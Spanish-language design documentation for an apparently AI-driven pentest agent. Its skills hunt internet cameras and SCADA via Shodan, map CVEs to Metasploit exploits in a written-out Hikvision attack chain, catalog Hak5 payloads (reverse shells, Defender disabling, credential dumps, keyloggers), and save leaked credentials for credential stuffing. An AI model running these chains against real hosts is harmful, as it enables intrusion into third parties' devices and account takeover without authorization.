### Diseño de `page/index.html`

- Paleta: `#0d0f14` base · `#7b6cf6` accent violet · `#3dba6f` green OK
- Sin canvas — fondo con radial gradient CSS ambient
- Thinking blocks: `<details>` colapsables con dots animados
- Reveal secuencial: cada párrafo de markdown aparece con stagger de 55 ms
- Copy buttons en cada bloque de código con badge de lenguaje
- Auto-scroll inteligente: pausa si el usuario subió (umbral 80px)
- Slash-menu: `/skill-name` con autocomplete de SKILL: — ver sección siguiente
- Phase tags y risk chips en mensajes del agente

### Slash Command Menu (`/`)

Escribir `/` en el input abre un menú de comandos rápidos (estilo Claude), con:

- **Dos secciones**: comandos estáticos de agente (22 entradas) + skills dinámicos del proyecto
- **Filtrado en tiempo real**: `/hack` filtra por nombre/tag/descripción
- **Navegación por teclado**: `↑↓` moverse · `↵` / `Tab` seleccionar · `Esc` cerrar
- **Animación** pop-up cubic-bezier con `max-height` y scroll interno

Comandos estáticos incluidos (`_SLASH_CMDS` en `page/index.html`):

| Trigger | Fill en input | Tag |
|---------|--------------|-----|
| `/hackea` | `hackea ` | auto |
| `/cameras` | `SKILL:shodan_query device_type=camera country=` | hunt |
| `/nuclei` | `SKILL:nuclei_scan target= severity=critical,high` | vuln |
| `/shodan` | `SKILL:shodan_query ` | recon |
| `/sqli` | `SKILL:sqli_scan target=` | ataque |
| `/exploitdb` | `SKILL:exploit_db search=` | vuln |
| `/msf` | `SKILL:metasploit mode=exploit target= module= lhost=` | exploit |
| `/bypass` | `bypass el login de ` | re |
| `/ad` | `SKILL:ad_audit target=` | AD |
| `/reporte` | `reporte` | util |
| `/vulns` | `listame vulnerabilidades` | util |
| (y 11 más…) | — | — |

Los skills del proyecto se obtienen de `S.skillCats` (endpoint `/api/projects/<id>/sessions/<s>/skills`) y se muestran en una segunda sección, filtrables igual que los estáticos.

---

## Skill: ad_audit (`skills/active_directory/ad_audit.py`)

Audita Domain Controllers de Active Directory sin herramientas externas (solo Python puro + `ldap3` auto-instalado).

### Vectores auditados

| Vector | Puerto | Técnica |
|--------|--------|---------|
| LDAP Anonymous Bind / Search | 389 | `ldap3` anon bind + search `(objectClass=user)` |
| LDAP Signing | 389 | SIMPLE bind con DN falso → `result 8` (requerido) vs `49` (no req.) |
| LDAPS cert validity | 636 | SSL handshake con `ssl.CERT_NONE` fallback |
| Global Catalog | 3268 | puerto TCP abierto |
| SMB Signing | 445 | SMB2 NEGOTIATE raw (sin Samba) → `SecurityMode` bits |
| SMB Null Session | 445 | `net use \\IP\IPC$` (Windows) / instrucciones rpcclient (Linux) |
| Kerberos | 88 | TCP connect |
| DNS SRV | 53 | `_ldap._tcp.dc._msdcs.<domain>` → auto-resolución de DCs |

### Uso

```
SKILL:ad_audit target=192.168.1.10
SKILL:ad_audit target=corp.local
SKILL:ad_audit target=10.10.0.0/24 timeout=1.5 threads=50
```

`target` acepta: IP, CIDR, hostname, dominio AD (descubre DCs via SRV).

### Findings emitidos

| Tipo | Severidad |
|------|-----------|
| `dc_identified` | info |
| `ad_confirmed` | info |
| `ldap_anonymous_search` | high |
| `ldap_anonymous_bind` | low |
| `ldap_signing_not_required` | medium |
| `ldaps_invalid_cert` | low |
| `ldap_global_catalog` | info |
| `kerberos_active` | info |
| `smb_signing_not_required` | medium |
| `smb_signing_disabled` | high |
| `smb_null_session` | high |

---

## Skill: whiteintel_num (`skills/pentest_skils/whiteintel_num.py`)

Versión nueva del skill de WhiteIntel que usa la API v1 con autenticación Bearer token.

**Diferencias vs `whiteintel`:**
- Auth: `Authorization: Bearer <key>` (vs `apikey` en cuerpo POST)
- Endpoints: GET `/api/v1/intel/domain/{query}` con múltiples fallbacks
- Soporta búsqueda por empresa (`company=`)
- Enumera también dominios expuestos y software comprometido
- Guarda resultados en `out/<proyecto>/credentials/`

**Salida en disco:**
```
credentials/
├── whiteintel_<tag>_<ts>.json          ← todos los datos normalizados
├── whiteintel_<tag>_<ts>_creds.txt     ← user:pass por línea (para cred_stuff)
└── whiteintel_<tag>_<ts>_raw.json      ← respuesta cruda de la API
```

---

## Skill: shodan_query v2 (`skills/pentest_skils/shodan_query.py`)

Dos modos de operación:

1. **Host lookup** (`target=<ip|dominio>`) — igual que v1, usa InternetDB (gratis) si no hay API key
2. **Search/Hunt** (`query=<dork>` o `device_type=<tipo>`) — requiere API key con plan Developer+

### Parámetros v2

| Parámetro | Descripción |
|-----------|-------------|
| `target` | IP o dominio para lookup de host individual |
| `device_type` | Preset de dispositivo: `camera`, `hikvision`, `dahua`, `router`, `mikrotik`, `cisco`, `industrial`, `scada`, `plc`, `modbus`, `database`, `mongodb`, `redis`, `elasticsearch`, `rdp`, `vnc`, `telnet`, `ssh`, `jenkins`, `wordpress`, `printer`, `voip`, `iot`, `solar`, … (40+ tipos) |
| `query` | Dork Shodan libre (ej: `'port:554 has_screenshot:true country:MX'`) |
| `product` | Añade `product:<product>` al query |
| `country` | Código de país ISO-2 (ej: `MX`, `ES`, `US`) |
| `port` | Filtra por puerto específico |
| `limit` | Máximo de resultados (default 10, max 100) |

### Flujo search/hunt

1. Construye el dork Shodan con `_build_query()` a partir de preset + filtros
2. Llama a `/shodan/host/search` con la API key
3. Para cada host encontrado: cruza CVEs/CPEs con `searchsploit` (si está instalado)
4. Genera `SKILL:metasploit` para CVEs mapeados en `_CVE_TO_MSF`
5. Si no hay API key → `_hunt_no_key()`: devuelve links equivalentes en ZoomEye / Censys / Fofa

### Findings v2

| Tipo | Severidad | Descripción |
|------|-----------|-------------|
| `exploit_available` | critical | CVE del host tiene exploit conocido en exploit-db |
| `cve_exposure` | high | CVE crítico/alto expuesto en host |
| `risky_port` | high | Puerto de alto riesgo (22, 445, 3389, 6379…) |
| `device_found` | medium | Dispositivo del tipo buscado encontrado |
| `host_info` | info | Datos de host (OS, org, puertos abiertos) |

---

## Skill: exploit_db (`skills/pentest_skils/exploit_db.py`)

Busca exploits en Exploit-DB para un término, CVE, producto o EDB-ID específico.

### Fuentes (por orden de prioridad)

1. `searchsploit --json <term>` — búsqueda local (más rápida y confiable, sin red)
2. `exploit-db.com` endpoint AJAX JSON — fallback vía requests
3. Scraping HTML de exploit-db.com — último recurso

### Parámetros

| Parámetro | Descripción |
|-----------|-------------|
| `search` | Término libre (ej: `hikvision`, `"wordpress plugin"`) |
| `cve` | CVE exacto (ej: `CVE-2021-36260`) |
| `product` | Nombre del producto (ej: `apache`) |
| `version` | Versión del producto (ej: `2.4.49`) |
| `edb_id` | ID numérico de Exploit-DB (ej: `50512`) |
| `type` | Filtro por tipo: `remote`, `webapps`, `local`, `dos`, `multiple` |
| `platform` | Filtro por plataforma (ej: `linux`, `windows`, `php`) |
| `limit` | Máximo de resultados (default 10) |

### Severidad de findings

| Tipo de exploit | Severidad |
|-----------------|-----------|
| `remote` / `multiple` | critical |
| `webapps` / `local` | high |
| `dos` | medium |

Cada finding incluye: `edb_id`, `title`, `type`, `platform`, `date`, `path`, `msf_cmds` (lista de `SKILL:metasploit` listos para copiar).

### Mapeos internos

- `_CVE_MSF`: 21 CVEs → módulo Metasploit (EternalBlue, Log4Shell, BlueKeep, PrintNightmare, Zerologon, ProxyLogon, Spring4Shell, DirtyPipe, PwnKit, Dirty COW…)
- `_PRODUCT_MSF`: 30+ palabras clave → lista de módulos MSF sugeridos

### Flujo de ataque completo

```
SKILL:shodan_query device_type=hikvision country=MX limit=20
    └─ devices con CVE-2021-36260 →
SKILL:exploit_db cve=CVE-2021-36260
    └─ exploit_found EDB-50512 →
SKILL:metasploit mode=exploit target=<ip> module=exploit/linux/http/hikvision_cmd_injection lhost=<lhost>
```

---

## Skill: ducky_dev (`skills/dev_skills/ducky_dev.py`)

Genera y valida payloads para toda la línea de dispositivos Hak5.

### Dispositivos soportados

| Dispositivo | Sintaxis | Modo | Encoder |
|-------------|----------|------|---------|
| `rubber_ducky` | DuckyScript 3.0 | HID (keystroke injection) | duck_encoder → inject.bin |
| `rubber_ducky_v1` | DuckyScript 1.0 | HID clásico | duck_encoder → inject.bin |
| `bash_bunny` | bash + Q keycmds | HID / STORAGE / ECM_ETHERNET / RNDIS_ETHERNET | Sin encoder |
| `omg_cable` | DuckyScript 3.0 | HID + WiFi C2 (192.168.4.1) | WebUI del cable |
| `wifi_pineapple` | bash/Python | WiFi MitM / PineAP / Evil Portal | Sin encoder |
| `shark_jack` | bash | Network recon vía eth0 | Sin encoder |

### Catálogo de payloads (24 plantillas)

| Categoría | Payloads |
|-----------|----------|
| `shell` | `win_reverse_shell`, `linux_reverse_shell`, `mac_reverse_shell`, `win_meterpreter_download` |
| `evasion` | `win_amsi_bypass_shell`, `win_disable_defender` |
| `persistence` | `win_add_admin_user`, `win_persistence_registry`, `linux_ssh_backdoor`, `linux_cron_persistence` |
| `credential_dump` | `win_sam_dump`, `win_lsass_dump`, `mac_keychain_dump` |
| `exfil` | `win_wifi_passwords`, `bb_storage_exfil` |
| `privilege_escalation` | `win_uac_bypass_fodhelper` |
| `surveillance` | `keystroke_logger`, `screenshot_exfil` |
| `c2` | `bb_twin_attack`, `omg_wifi_c2` |
| `phishing` | `pineapple_captive_portal` |
| `recon` | `sharkjack_recon`, `lockpicker_os_detect` |

### Características

- **DuckyScript 3.0**: VAR, IF/ELSE/END_IF, WHILE/END_WHILE, FUNCTION, ATTACKMODE, EXTENSION DETECT_READY
- **Generación Base64 automática**: `win_reverse_shell` codifica el payload PowerShell en UTF-16LE Base64 para evitar problemas de escaping
- **Validador integrado**: verifica comandos DuckyScript v1/v3 y detecta DELAY inválidos
- **Encoder**: llama a `duck_encoder` / `ducky-encoder.jar` si está instalado para generar `inject.bin`
- **Generación custom con IA**: `request=` envía la tarea al mejor modelo Ollama disponible con system prompt especializado en Hak5
- **Output**: guarda en `out/<proyecto>/dev/ducky/<nombre>_<ts>.txt`

---

## Categoría OSINT (`skills/osint_skills/`)

10 skills de inteligencia en fuentes abiertas. Todos siguen el mismo patrón: intentan la herramienta nativa de Kali primero, con fallback a Python puro + APIs gratuitas.

| Skill | Fuentes primarias (Kali) | Fallback Python | APIs opcionales |
|-------|--------------------------|-----------------|-----------------|
| `theharvester` | theHarvester | crt.sh, HackerTarget, URLScan, OTX | — |
| `sherlock_osint` | Sherlock, Maigret | 45 plataformas paralelas (20 threads) | — |
| `email_osint` | Holehe, H8mail | Gravatar, EmailRep.io, dig MX | HIBP, Hunter.io |
| `breach_search` | H8mail | Phonebook.cz | HIBP, LeakCheck, DeHashed, IntelX, Snusbase |
| `dns_full` | DNSRecon, Fierce, Amass | socket brute-force, python-dns | — |
| `metadata_osint` | Metagoofil, ExifTool | DuckDuckGo search + download | — |
| `phone_osint` | PhoneInfoga | carrier detect, DuckDuckGo | NumVerify, AbstractAPI, Twilio CNAM |
| `wayback_osint` | GAU, waybackurls | CDX API (gratis) | — |
| `recon_ng_osint` | Recon-ng | WHOIS, DNS brute, HackerTarget, GitHub API | GITHUB_TOKEN |
| `social_osint` | — | Reddit API, DDG, GitHub API | TWITTER_BEARER_TOKEN, GITHUB_TOKEN |

### Severidad de findings OSINT

| Skill | critical | high | medium | info |
|-------|----------|------|--------|------|
| `breach_search` | hibp_breach / leaked_credential / dehashed_credential | intelx_record / paste_exposure | email (Phonebook) | — |
| `email_osint` | hibp_breach / breach_found | account_found / suspicious_email | gravatar_profile / mail_provider | — |
| `dns_full` | axfr_success / subdomain_takeover | no_spf / spf_permissive | spf_softfail / no_dmarc | subdomain / dns_* |
| `metadata_osint` | — | username | software / internal_path | — |
| `phone_osint` | — | caller_name | voip_number / premium_number | valid_phone / carrier |
| `wayback_osint` | secret_in_history / sensitive_file | deleted_path / config_file | parameter_urls | historical_subdomain |
| `recon_ng_osint` | — | vulnerability / github_secret | employee / github_repo / contact | subdomain / host |
| `social_osint` | github_secret / paste_leak | twitter_leak / social_leak | employee | social_mention |
| `sherlock_osint` | — | — | social_profile | — |
| `theharvester` | — | — | email | subdomain / host |

---

## Problemas conocidos y soluciones

| Problema | Causa | Solución |
|----------|-------|----------|
| Skills no se cargaban | Loader solo escaneaba `skills/*.py` | `importlib.util.spec_from_file_location` + scan de subdirectorios |
| `AttributeError: 'list' object` en nuclei | nuclei `-json-export` escribe array en una línea | `isinstance(item, list)` → `.extend()` |
| CRT.SH timeout | `curl --max-time 10` insuficiente | `SKILL:crtsh_enum` en `run_pentest_phases()` |
| CVEs null en `listame vulnerabilidades` | Parser línea-a-línea fallaba | `re.finditer` sobre texto completo |
| `explotar N` con `searchsploit N/A` | Fallback literal `'N/A'` | Prioridad: CVE → componente → título |
| `SyntaxWarning: invalid escape` en Python 3.12 | `\|` en str no-raw | Cambiado a raw string |
| Bucle SHODAN_API_KEY infinito | Modelo pide key aunque esté disponible | `keys_requested_rounds > 3` → break |
| `BINPATH`/`OUTDIR` literales en comandos | Modelo copia placeholders del system prompt | Sustitución en Python antes de ejecutar |
| r2 timeout en binarios grandes | `aaa` sobre 10 MB tarda >5 min | timeout 300s en subprocess |
| nuclei `could not find template` | Paths relativos no encontrados | `find_nuclei_templates()` + `nuclei_fix_template_paths()` |
| gobuster 403 wildcard | Todos los paths devuelven 403 | `gobuster_dir` detecta wildcard y añade `--wildcard` |
| Modelo explica en vez de ejecutar | `task_complete: True` en JSON de error | Default `False` + push-back `empty_cmd_count` |
| Bucle infinito en agente RE | force-continue sin contexto | Análisis inicial sin LLM + `empty_count` counter |
| Proyectos mezclados por target | `out/<target>/` cambiaba con cada target | `pick_or_create_project()` → `out/<proyecto>/` fijo |
| `summarize_if_needed` timeout infinito | Ollama timeout → devuelve conv sin cambios → loop | `_hard_truncate()` fallback determinista cuando LLM falla |
| nuclei `-categories` flag inválida | Flag no existe en nuclei v3 | `re.sub` convierte `-categories X` → `-tags X` |
| nuclei paths `~/nuclei-templates/X/` | Path relativo no resuelto | Regex reemplaza `~/nuclei-templates/` y rutas absolutas erróneas por path real |
| gobuster wildcard auto-retry | 403 wildcard rompe el scan | Detecta "wildcard" en stderr, reintenta con `--wildcard` |
| Modelo devuelve markdown en vez de JSON | `_json_parse_error: True` marcado pero `task_complete: True` | Fallback retorna `task_complete: False` + `_json_parse_error: True` → push-back dedicado |
| subfinder crudo en commands | Modelo escribe `subfinder -d X` en vez de `SKILL:` | `_map_raw_to_skill()` auto-convierte antes de ejecutar |
